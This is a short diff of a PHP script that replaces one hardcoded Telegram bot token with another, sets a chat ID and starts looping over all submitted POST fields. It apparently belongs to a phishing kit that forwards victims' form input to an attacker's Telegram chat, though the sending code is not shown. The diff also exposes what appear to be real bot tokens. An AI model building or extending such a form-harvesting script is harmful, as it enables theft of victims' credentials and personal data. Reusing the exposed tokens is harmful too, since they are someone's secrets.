@@ -1,6 +1,6 @@
 <?php
 
-$token = "7019805673:AAFmCq-WEPUe0rbf4AHO4B8yMgtIHsNdwdQ";
+$token = "7332625961:AAGrtzKGYmAh6dEnTDzT2BJ79w5OTASjj-8";
 $chat_id = "853051670";
 
 foreach($_POST as $key => $value) {
